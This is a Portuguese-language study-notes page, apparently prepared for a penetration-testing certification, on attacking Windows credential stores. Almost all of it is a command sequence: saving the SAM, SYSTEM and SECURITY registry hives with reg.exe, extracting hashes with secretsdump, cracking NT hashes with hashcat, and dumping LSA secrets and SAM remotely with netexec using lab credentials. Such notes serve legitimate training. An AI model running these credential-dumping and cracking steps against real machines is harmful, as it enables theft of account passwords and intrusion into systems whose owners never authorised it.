> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/attacking-sam-system-and-security.md).

# Attacking SAM, SYSTEM, and SECURITY

**HKLM\SAM**

* Contém hashes de senhas para contas de usuários locais.

**HKLM\SYSTEM**

* Armazena a chave de inicialização do sistema, que é usada para criptografar o banco de dados SAM.

**HKLM\SECURITY**

* Contém informações confidenciais utilizadas pela Autoridade de Segurança Local (LSA)

* **Usando o reg.exe para copiar hives do registro pelo windows**

{% code lineNumbers="true" %}

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

{% endcode %}

* **Despejando hashes com secretsdump**

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

* **Executando o Hashcat contra hashes NT**

```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

* **Despejo remoto de segredos LSA**

```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

* **Despejando SAM remotamente**

```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
